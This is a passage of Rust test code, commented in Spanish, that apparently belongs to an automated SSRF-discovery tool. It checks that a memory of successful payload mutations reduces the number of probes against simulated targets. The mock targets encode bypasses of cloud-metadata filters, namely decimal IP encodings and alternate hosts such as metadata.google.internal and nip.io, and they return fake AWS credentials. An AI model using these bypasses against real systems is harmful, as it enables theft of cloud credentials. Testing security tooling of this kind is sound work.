        // prueba (la Fase 2 no lo compone) → Seco.
        let nuevo = procesar_url(
            &pool, "prog", program_id, "https://host-B.com/fetch?url=x",
            &SoloElMarcador, 100, None, &mut guard_test(), 0, &mut || 0.5, None, &objetivos_aws(),
        )
        .await
        .unwrap();
        assert!(nuevo, "B confirmó RECICLANDO la variante de A (Fase 1.7); sin ella quedaría seco");
    }

    /// Objetivo vulnerable SOLO a host alterno: filtra la IP literal Y sus
    /// codificaciones numéricas, cede solo a `metadata.google.internal`/nip.io.
    /// Fuerza al ciclo 1 a buscar mucho (falla toda la familia de codificación
    /// antes de dar con host-alterno), para que la memoria del ciclo 2 luzca.
    struct SoloHostAlterno;
    impl Sonda for SoloHostAlterno {
        async fn pedir(&self, payload: &str) -> Option<(u16, String)> {
            if payload.contains("nip.io") || payload.contains("metadata.google.internal") {
                let cuerpo = r#"{"Code":"Success","AccessKeyId":"ASIAEXAMPLE","SecretAccessKey":"s"}"#;
                Some((200, cuerpo.to_string()))
            } else {
                // literal y codificaciones numéricas: filtro de destino.
                Some((403, "Blocked host: private ip".to_string()))
            }
        }
    }

    #[tokio::test]
    async fn dos_ciclos_la_memoria_reduce_las_sondas() {
        let pool = pool_migrado().await;
        let host = "victima-mem.example.com";
        let sonda = SoloHostAlterno;

        // CICLO 1: sin memoria previa. Adapta desde cero: falla toda la familia de
        // codificación antes de dar con host-alterno. Guarda la secuencia ganadora.
        let r1 = cazar_y_recordar(&pool, &sonda, "prog", host, 100, &mut guard_test(), 0, &mut || 0.5, &objetivos_aws()).await.unwrap();
        let (fam1, pay1, n1) = match &r1 {
            Resultado::Confirmado { familia, payload_ganador, intentos, .. } => {
                (*familia, payload_ganador.clone(), *intentos)
            }
            _ => panic!("ciclo 1 debe confirmar"),
        };

        // CICLO 2: mismo filtro (misma huella). El bucle LIDERA con la mutación
        // recordada — confirma con muchas menos sondas.
        let r2 = cazar_ssrf(&sonda, 100, Some(Memoria { pool: &pool, host, program_name: "prog-test", enforce_ttl: None }), &mut guard_test(), 0, &mut || 0.5, &objetivos_aws()).await;
        let (fam2, pay2, n2) = match &r2 {
            Resultado::Confirmado { familia, payload_ganador, intentos, .. } => {
                (*familia, payload_ganador.clone(), *intentos)
            }
            _ => panic!("ciclo 2 debe confirmar"),
        };

        println!("\n  ── dos ciclos contra {host} (vulnerable solo a host-alterno) ──");
        println!("  CICLO 1 (adapta desde cero): {n1} sondas → gana {} con {pay1}", fam1.nombre());
        println!("  CICLO 2 (lidera con memoria): {n2} sondas → gana {} con {pay2}", fam2.nombre());
        println!("  la memoria ahorró {} sondas ({}→{})\n", n1.saturating_sub(n2), n1, n2);

        assert_eq!(fam1, Familia::HostAlterno, "ciclo 1 descubre host-alterno");
        assert_eq!(fam2, fam1, "ciclo 2 confirma la MISMA mutación recordada");
        assert_eq!(pay2, pay1, "mismo payload ganador");
        assert!(n2 < n1, "la memoria reduce las sondas: {n2} debe ser < {n1}");
    }

    /// Objetivo que hace DERIVAR `clase_observada`: una codificación intermedia
    /// (decimal) devuelve 200-sin-metadata → la "adaptación fina" flipa la clase a
    /// SinExfiltracion antes de que host-alterno confirme. Si la huella se guardara
    /// con la clase DERIVADA ("abierto"), el ciclo 2 —que busca con la del filtro
    /// real ("destino")— no acertaría nunca. Es el caso que la revisión pidió.
    struct DerivaClaseIntermedia;
    impl Sonda for DerivaClaseIntermedia {
        async fn pedir(&self, payload: &str) -> Option<(u16, String)> {
            if payload.contains("nip.io") || payload.contains("metadata.google.internal") {
                Some((200, r#"{"AccessKeyId":"ASIAX","SecretAccessKey":"s"}"#.to_string()))
            } else if payload.contains("2852039166") {
                Some((200, "<html>benigno</html>".to_string())) // 200 sin metadata → DERIVA
            } else {
                Some((403, "Blocked host: private ip".to_string())) // literal + otras cod.
            }
        }
    }

    #[tokio::test]
    async fn la_deriva_de_clase_no_rompe_la_memoria() {
        let pool = pool_migrado().await;
        let host = "deriva.example.com";
        let sonda = DerivaClaseIntermedia;

        // Ciclo 1: confirma host-alterno pese a la deriva. La huella guardada debe
        // ser la del FILTRO real ("destino"), no la derivada ("abierto").
        let r1 = cazar_y_recordar(&pool, &sonda, "prog", host, 100, &mut guard_test(), 0, &mut || 0.5, &objetivos_aws()).await.unwrap();
        let (huella1, n1) = match &r1 {
            Resultado::Confirmado { familia, huella, intentos, .. } => {
                assert_eq!(*familia, Familia::HostAlterno);
                (huella.clone(), *intentos)
            }
            _ => panic!("ciclo 1 debe confirmar"),
        };
        assert_eq!(huella1, huella_filtro(ClaseBloqueo::FiltroDestino),
            "la huella se guarda con el filtro real, no con la clase derivada");

        // Ciclo 2: la memoria acierta —solo posible si las huellas de guardar y
        // buscar coinciden—, con muchas menos sondas.
        let r2 = cazar_ssrf(&sonda, 100, Some(Memoria { pool: &pool, host, program_name: "prog-test", enforce_ttl: None }), &mut guard_test(), 0, &mut || 0.5, &objetivos_aws()).await;
        match &r2 {
            Resultado::Confirmado { familia, intentos, .. } => {
                assert_eq!(*familia, Familia::HostAlterno, "ciclo 2 recuerda host-alterno");
                assert!(*intentos < n1, "la memoria acierta pese a la deriva: {intentos} < {n1}");
            }
            _ => panic!("ciclo 2 debe confirmar vía memoria"),
        }
    }

    #[tokio::test]
    async fn confirma_y_guarda_secuencia() {
        let pool = sqlx::sqlite::SqlitePoolOptions::new()
            .max_connections(1)
            .connect("sqlite::memory:")
            .await
            .unwrap();
        sqlx::migrate!("./migrations").run(&pool).await.unwrap();

        let sonda = FiltraLiteralPeroVulnerableACodificacion;
        let r = cazar_y_recordar(&pool, &sonda, "prog", "victima.example.com", 100, &mut guard_test(), 0, &mut || 0.5, &objetivos_aws())
            .await
            .unwrap();
        assert!(matches!(r, Resultado::Confirmado { .. }));

        // La secuencia ganadora quedó en la memoria, vigente.
        let n = secuencias::contar_vigentes(&pool, "victima.example.com").await.unwrap();
        assert_eq!(n, 1, "el acierto se recordó como secuencia");
    }
}
